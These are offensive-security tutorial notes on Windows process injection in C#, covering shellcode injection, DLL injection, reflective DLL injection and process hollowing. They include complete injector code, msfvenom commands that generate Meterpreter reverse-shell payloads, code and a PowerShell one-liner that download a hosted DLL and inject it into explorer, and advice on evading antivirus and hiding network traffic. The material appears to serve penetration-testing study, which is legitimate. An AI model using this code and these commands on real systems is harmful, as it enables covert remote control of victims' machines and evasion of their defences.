# Process Injection

## Process Injection Theory

Process : A Container that is created to house a running application. Each Windows Process maintains it's own virtual space, interaction between these spaces can take place with the help of Win32 APIs

Thread : Executes the compiled assembly code of an application. A process can have multiple threads, each thread has its own stack and shares the memory of the process.

Win32 APIs : _OpenProcess_ , _VirtualAllocEx_ , _WriteProcessMemory_ and _CreateRemoteThread_.

> All Processes have **Integrity level**. Higher integrity level process can interact with lower integrity process, but the reverse is not possible. This is done to prevent privilege escalation.

> We can check the integrity levels : Right click on exe > Properties > Security

&nbsp;

## Process Injection in C#

We'll be using 4 Win32 APIs from Kernel32.dll -

- _OpenProcess_ : To open a channel from one process to another.
- _VirtualAllocEx_ : To modify it's memory space and create a memory space for our shellcode.
- _WriteProcessMemory_ : Write the shellcode to the created memory space.
- _CreateRemoteThread_ : To execute the shellcode in a new thread in the memory space.

&nbsp;

Understanding each Function in-depth :

**_OpenProcess_**

Function :

    HANDLE OpenProcess(
        DWORD dwDesiredAccess,
        BOOL bInheritHandle,
        DWORD dwProcessId
    );

Explanation :

- The first argument _dwDesiredAccess_ is the access right we want to obtain, it's value will be cross checked with the security descriptor.
- The second argument _bInheritHandle_ tells if the child process can inherit this handle. If it's value is **TRUE**, processes created by this process will iherit this handle.
- The third argument _dwProcessId_ is the Process ID of the process in which we want to inject our shellcode.

> Documentation :
>
> - https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
> - https://docs.microsoft.com/en-gb/windows/win32/procthread/process-security-and-access-rights

&nbsp;

**_VirtualAllocEx_**

Function :

    LPVOID VirtualAllocEx(
        HANDLE hProcess,
        LPVOID lpAddress,
        SIZE_T dwSize,
        DWORD flAllocationType,
        DWORD flProtect
    );

Explanation :

- The first argument _hProcess_ is the process handle of the process.
- The second argument _lpAddress_ is the desired starting address in the allocated space.
- The third argument _dwSize_ sets the size of the allocated size.
- The dwSize contains the size of the buffer, in our case it is the size of our shellcode.
- The flAllocationType has the type of memory allocation(Types: MEM_COMMIT, MEM_RESERVE, MEM_RESET, MEM_RESET_UNDO)
- The flProtect has the memory Protections for the allocated memory

> Documentation :
>
> - https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
> - https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants

&nbsp;

**_WriteProcessMemory_**

Function :

    BOOL WriteProcessMemory(
        HANDLE hProcess,
        LPVOID lpBaseAddress,
        LPCVOID lpBuffer,
        SIZE_T nSize,
        SIZE_T *lpNumberOfBytesWritten
    );

Explanation :

- The first argument _hProcess_ is the process handle of the victim process.
- The second argument _lpBaseAddress_ is the address of the allocated memory address.
- The third argument _lpBuffer_ is the buffer of the shellcode.
- The fourth argument _nSize_ is the size of the buffer.
- The fifth argument _\*lpNumberOfBytesWritten_ is the pointer to a variable that recieves the number of bytes transferred. If set to NULL, the parameter is ignored.

> Documentation :
>
> - https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory

&nbsp;

**_CreateRemoteThread_**

Function :

    HANDLE CreateRemoteThread(
        HANDLE hProcess,
        LPSECURITY_ATTRIBUTES lpThreadAttributes,
        SIZE_T dwStackSize,
        LPTHREAD_START_ROUTINE lpStartAddress,
        LPVOID lpParameter,
        DWORD dwCreationFlags,
        LPDWORD lpThreadId
    );

Explanation :

- The first argument _hProcess_ is the process handle of the victim process.
- The second argument _lpThreadAttributes_ is the desired security attributes
- The third argument is the initial size of the stack, we can set it to 0 to use the default values.
- The fourth argument _lpStartAddress_ is the starting address of the thread (address of the allocated buffer).
- The fifth argument _lpParameter_ is the pointer to a variable to be passed to the thread function.
- The sixth argument _dwCreationFlags_ controls the creation of the thread. It can have three values : 0, CREATE_SUSPENDED and STACK_SIZE_PARAM_IS_A_RESERVATION .
- The seventh argument _lpThreadId_ is a pointer to a variable that receives the thread identifier. If this parameter is NULL, the thread identifier is not returned.

> Documentation :
>
> - https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread

&nbsp;

MSFVENOM COMMAND :

    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f csharp EXITFUNC=thread

&nbsp;

Final Code :

    using System;
    using System.Runtime.InteropServices;
    namespace Inject
    {
        class Program
        {

            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
            static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
            static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

            [DllImport("kernel32.dll")]
            static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

            [DllImport("kernel32.dll")]
            static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

            static void Main(string[] args)
            {

                IntPtr hProcess = OpenProcess(0x001F0FFF, false, 4804);
                IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
                byte[] buf = new byte[591] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x0a,0x41,0x89,0xda,0xff,0xd5 };
                IntPtr outSize;
                WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
                IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            }
        }
    }

&nbsp;

Explanation :

- We first import the System and the interop classes to interact with the APIs and other functions.
- Next we specify the namespace followed by the class inside it.
- The following statements are DllImports which import the Win32 APIs from Kernel32. These can be obtained from [pinvoke](https://pinvoke.net)
- Next is the Main function inside which we write our code.
- We open a channel to a new process using the _OpenProcess_ API, the first argument specifies the PROCESS_ALL_ACCESS in hexadecimal, the second argument specifies if child processes can inherit this handle. The third argument specifies the process ID of the victim process. We store this in the hProcess variable.
- Now we allocate the space in the process using the _VirtualAllocEx_. The first argument specifies the process handle, the second argument is set to zero so that the API can select an unused address. The third, fourth and fifth arguments are the size, type of allocation and protections of the allocated memory. 0x1000 specifies a size of 1000 bytes, 0x3000 specifies MEM_COMMIT and MEM_RESERVE and 0x40 specifies read,write and execute of the allocated space.
- We then specify the buf variable which stores the shellcode generated by msfvenom.
- The _WriteProcessMemory_ takes 5 arguments.
  - The first argument specifies the process handle.
  - The second argument is the address of the allocated space
  - The third argument is the shellcode buffer.
  - The fourth argument is the size of the shellcode buffer.
  - The fifth argument is a pointer to a location in memory to output how much data was copied. The datatype is **out** because we want an address pointer and this should also align with the function prototype.
- In the _CreateRemoteThread_, except the first and the fourth argument, the rest are NULL so that the API considers default values.
  - The first argument specifies the process handle created.
  - The fourth handle specifies the address to the allocated memory.

> Documentation :
>
> - https://docs.microsoft.com/en-us/dotnet/csharp/language-reference/keywords/out-parameter-modifier

&nbsp;

# DLL Injection

## DLL Injection Theory

- To use an API from a DLL, we have to use the LoadLibrary API to load the dll onto the virtual memory space.
- The LoadLibraryA module takes in only only argument which is the name of the dll.
- Function prototype of LoadLibraryA :

  HMODULE LoadLibraryA(
  LPCSTR lpLibFileName
  );

- LoadLibrary caannot be invoked on remote processes, but our workaround to this problem is that we'll resolve it's address using the _GetProcAddress_ and _GetModuleHandle_. Since the native windows DLLs are allocated same base address across processes, so the address of LoadLibraryA would be same for our current and remote process.
- We can then pass this address along with the allocated dll as the argument

&nbsp;

## DLL Injection in C#

MSFVENOM Payload :

    sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=<PORT> -f dll -o shell.dll

Final Code :

    using System;
    using System.Diagnostics;
    using System.Net;
    using System.Runtime.InteropServices;
    using System.Text;

    namespace Inject
    {
        class Program
        {
            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
            static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
            static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

            [DllImport("kernel32.dll")]
            static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

            [DllImport("kernel32.dll")]
            static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

            [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
            static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

            [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
            public static extern IntPtr GetModuleHandle(string lpModuleName);

            static void Main(string[] args)
            {
                String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                String dllName = dir + "\\shell.dll";
                WebClient wc = new WebClient();
                wc.DownloadFile("<Hosted DLL web address>", dllName);
                Process[] expProc = Process.GetProcessesByName("explorer");
                int pid = expProc[0].Id;
                IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
                IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
                IntPtr outSize;
                Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);
                IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
                IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
            }
        }
    }

&nbsp;

Explanation :

- We first import the System and interop namespaces to interact with the win32 APIs and System classes
- We then define a namespace called Inject followed by a class called Program inside this namespace.
- This is follwed by the Pinvoke statements to load the required Win32 APIs
- We then specify the Main method inside which our code is written.
- We get the Full system path of Document folder and store it in the dir variable.
- We then store the name of the dll with its complete path in dllName
- Next is to download the hosted DLL and save it to this file
- To get the process ID of explorer, we use the GetProcessByName and then extract it's ID from that.
- We then open a new process to explorer using _OpenProcess_
- Using _VirtualAllocEx_ we can allocate a space in this remote process.
- We write the dll into this handle using the _WriteProcessMemory_ API. We encode the dll before writing it in.
- Using _GetProcAddress_ and _GetModuleHandle_ we can get the address of the LoadLibraryA.
- We then create a remote thread, but this time we pass the address of the LoadLibraryA and the dll as it's argument. This way we can execute a dll in a remote process.

&nbsp;

> Documentation :
>
> - https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya
> - https://codingvision.net/c-inject-a-dll-into-a-process-w-createremotethread

&nbsp;

# Reflective DLL Injection

- In DLL injection, the DLL is loaded from the disk to the remote process. Writing DLL to the disk can trigger AV and can compromise out attack.
- A workaround to this problem would be to implement Reflective DLL injection. The DLL is injected to the victim process directly from memory rather than from disk.
- This basically maps the DLL's Portable Executable format content into the memory.
- We can use a powershell module to implement the functionality of the LoadLibrary but avoid writing to the disk and also bypass detection by process explorer and AV.
- For this we can use the _Invoke-ReflectPEInjection_ to parse the contents of the PE file and perform reflection to avoid writing to the disk.
- This tool has two functionalities: reflectively load PE or EXE to same process or reflective load DLL onto remote process.

Import the powershell module :

    Import-Module Invoke-ReflectivePEInjection.ps1

Powershell Code to perform Reflective DLL Injection

    $bytes = (New-Object System.Net.WebClient).DownloadData('<Hosted DLL file>')
    $procid = (Get-Process -Name explorer).Id

    Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid

&nbsp;

> Documentation :
>
> - https://github.com/stephenfewer/ReflectiveDLLInjection
> - https://docs.microsoft.com/en-us/windows/win32/debug/pe-format
> - https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1
> - https://www.ired.team/offensive-security/code-injection-process-injection/reflective-dll-injection

&nbsp;

# Process Hollowing

- The issue in the above method of process injection is that we may still be detected as we generate network traffic from programs such as explorer and notepad.
- We can migrate to svchost to mask our identity as it generates network activity.
- The problem here is svchost runs by default at SYSTEM integrity level, we cannot inject into such processes.
- We can solve this problem by using a method called **Process Hollowing**, in which we start the processes as suspended and then modify it before it starts execution.

## Theory

- During the creation of a process using _CreateProcess_ API, we can set the CREATE_SUSPENDED to create a new suspended process.
- When a process is created using _CreateProcess_ , the OS does a few things :-
  - Creates virtual memory space for the process
  - Allocates stack along with Thread Environment Block(TEB) and Process Environment Block(PEB)
  - Loads the required EXE and DLL to the memory
- Once the above tasks are done, the OS will create a thread to execute the code. If we suppply the CREATE_SUSPENDED flag, then the execution will stop just before it runs the first instruction.
- Now to locate the entrypoint of the executable, we can use the _ZwQueryInformationProcess_ API to retrive the PEB.
- From the PEB, we can obtain the base address of the process and use this to parse the PE Headers and locate the entrypoint.
- We can find the base address at an offset of 0x10 into the PEB
- After the _ZwQueryInformationProcess_ yields the address of the PEB, we can use the _ReadProcessMemory_ API to read the contents of the PEB at offset 0x10
- First we read the e_lfanew field at offset 0x3C, this contains the offset from the beginning of the PE file to the PE Header.
- We then read the Relative Virtual Address (RVA) of the Entrypoint at offset 0x28 from the PE Header, this needs to be added to the base address of the remote process to obtain the absolute memory address.
- Once we have the entrypoint of the remote process, we can use the WriteProcessMemory to overwrite the original contents of the executable.
- We can then resume the execution of the thread.

> All PE Files follow a standard format, this helps us to predict where to find the required offsets.

> Documentation :
>
> - https://en.wikipedia.org/wiki/Win32_Thread_Information_Block
> - https://en.wikipedia.org/wiki/Process_Environment_Block
> - https://en.wikipedia.org/wiki/Address_space_layout_randomization
> - https://docs.microsoft.com/en-us/windows/win32/procthread/zwqueryinformationprocess
> - https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory
> - https://gist.github.com/smgorelik/9a80565d44178771abf1e4da4e2a0e75
> - https://github.com/sbridgens/ProcessHollowing
